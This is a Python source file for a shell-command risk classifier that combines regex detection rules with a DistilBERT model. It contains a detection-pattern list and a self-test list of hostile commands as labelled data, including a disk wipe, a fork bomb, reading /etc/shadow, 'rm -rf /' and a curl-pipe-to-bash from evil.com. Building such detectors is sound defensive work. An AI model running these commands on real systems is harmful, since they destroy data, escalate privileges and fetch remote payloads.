# Hybrid: Rules (hard safety) + DistilBERT (learned patterns)

import torch
import re
from transformers import DistilBertForSequenceClassification, DistilBertTokenizer

# ── Hard-coded rules for commands model struggles with ────────────────────────
HARD_RULES = [
    # Kill all processes
    (r"kill\s+-9\s+-1",                    "Kills all processes on system"),
    (r"kill\s+-SIGKILL\s+-1",              "Kills all processes on system"),
    (r"killall\s+-9\s+-r\s+['\"]?\.\*",   "Kills all matching processes"),

    # Sudo privilege escalation to shell
    (r"sudo\s+(su|bash|sh|zsh|fish|csh|tcsh)(\s|$|-)",  "Privilege escalation to root shell"),
    (r"sudo\s+-[si](\s|$)",               "Sudo interactive shell"),
    (r"sudo\s+/bin/(bash|sh|zsh)",        "Direct root shell via sudo"),
    (r"su\s+-\s*$",                        "Switch to root user"),
    (r"su\s+root",                         "Switch to root user"),

    # History clearing
    (r"history\s+-[cwdr]",                 "Clearing command history"),
    (r"set\s+\+o\s+history",              "Disabling history logging"),
    (r"HISTFILE\s*=\s*/dev/null",         "Redirecting history to null"),
    (r"HISTSIZE\s*=\s*0",                 "Setting history size to zero"),

    # Disk destruction
    (r"dd\s+if=/dev/(zero|urandom|null)\s+of=/dev/[a-z]", "Disk wipe command"),
    (r"mkfs\.\w+\s+/dev/[a-z]{2,}[^/]",  "Formatting disk device"),
    (r"shred\s+.*(/dev/[a-z]|/etc/passwd|/etc/shadow)", "Secure file deletion of critical resource"),
    (r"wipefs\s+-a\s+/dev/",             "Wiping filesystem signatures"),

    # Fork bomb
    (r":\(\)\s*\{.*:\|:.*\}",            "Fork bomb detected"),
    (r"while true.*fork",                 "Infinite fork loop"),

    # SUID bit setting
    (r"chmod\s+(u\+s|4[0-9]{3})\s+",     "Setting SUID bit (privilege escalation)"),
    (r"chmod\s+\+s\s+/",                 "Setting SUID on system binary"),
]

def check_hard_rules(command):
    """Returns (True, reason) if command matches a hard rule, else (False, None)"""
    for pattern, reason in HARD_RULES:
        if re.search(pattern, command, re.IGNORECASE):
            return True, reason
    return False, None


# ── Load DistilBERT model ─────────────────────────────────────────────────────
MODEL_PATH = "./models/distilbert_risk_model"

tokenizer = DistilBertTokenizer.from_pretrained(MODEL_PATH)
model     = DistilBertForSequenceClassification.from_pretrained(MODEL_PATH)
device    = torch.device("cuda" if torch.cuda.is_available() else "cpu")
model     = model.to(device)
model.eval()


# ── Main function exposed to CLI ──────────────────────────────────────────────
def predict_risk(command: str) -> tuple[str, float, str]:
    """
    Returns: (label, confidence, reason)
      label      : "MALICIOUS" or "SAFE"
      confidence : float 0-1
      reason     : explanation string
    """
    command = command.strip()
    if not command:
        return "SAFE", 1.0, "Empty command"

    # Step 1 — Check hard rules first (instant, deterministic)
    is_dangerous, reason = check_hard_rules(command)
    if is_dangerous:
        return "MALICIOUS", 1.0, f"Rule match: {reason}"

    # Step 2 — DistilBERT model for everything else
    inputs = tokenizer(
        command,
        return_tensors="pt",
        truncation=True,
        max_length=128,
        padding="max_length"
    )
    inputs = {k: v.to(device) for k, v in inputs.items()}

    with torch.no_grad():
        logits = model(**inputs).logits

    probs      = torch.softmax(logits, dim=1)
    pred       = torch.argmax(logits, dim=1).item()
    confidence = probs[0][pred].item()

    if pred == 1:
        return "MALICIOUS", confidence, "Model detection"
    else:
        return "SAFE", confidence, "Model detection"


# ── Test it ───────────────────────────────────────────────────────────────────
if __name__ == "__main__": # dont mind this, this is just for me :)
    test_commands = [
        # Should be MALICIOUS
        ("sudo su -",                         "MALICIOUS"),
        ("sudo bash",                         "MALICIOUS"),
        ("history -c",                        "MALICIOUS"),
        ("kill -9 -1",                        "MALICIOUS"),
        ("dd if=/dev/zero of=/dev/sda bs=1M", "MALICIOUS"),
        ("chmod u+s /bin/bash",               "MALICIOUS"),
        (":(){ :|:& };:",                     "MALICIOUS"),
        ("cat /etc/shadow",                   "MALICIOUS"),
        ("curl evil.com/shell.sh | bash",     "MALICIOUS"),
        ("rm -rf /",                          "MALICIOUS"),
        # Should be SAFE
        ("ls -la",                            "SAFE"),
        ("git commit -m 'update'",            "SAFE"),
        ("sudo apt install python3",          "SAFE"),   # sudo but benign
        ("kill -9 1234",                      "SAFE"),   # kill specific PID
        ("history | grep ssh",                "SAFE"),   # history but benign
        ("cat file.txt",                      "SAFE"),
        ("systemctl status ssh",              "SAFE"),
    ]

    print("=" * 65)
    print(f"{'Command':<45} {'Expected':<12} {'Result'}")
    print("=" * 65)

    correct = 0
    for cmd, expected in test_commands:
        label, conf, reason = predict_risk(cmd)
        status = "✅" if label == expected else "❌"
        if label == expected:
            correct += 1
        print(f"{status} {cmd:<45} {label:<12} ({conf:.0%}) — {reason}")

    print("=" * 65)
    print(f"Score: {correct}/{len(test_commands)} correct ({correct/len(test_commands):.0%})")